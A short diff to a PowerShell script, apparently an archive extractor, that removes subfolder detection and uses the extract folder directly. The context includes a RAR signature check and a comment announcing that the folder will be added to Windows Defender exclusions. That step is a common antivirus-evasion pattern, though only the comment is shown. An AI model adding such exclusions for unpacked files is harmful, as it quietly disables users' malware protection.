@@ -64,13 +64,8 @@ if ($header -eq "52617221") {
     exit
 }
 
-# Detect extracted folder
-Write-Host "Detecting extracted folder structure..."
+# Use extract folder as final folder
 $finalFolder = $extractFolder
-$subfolders = Get-ChildItem -Path $extractFolder -Directory
-if ($subfolders.Count -eq 1) {
-    $finalFolder = $subfolders[0].FullName
-}
 Write-Host "Using final folder path: $finalFolder"
 
 # Add to Defender exclusion
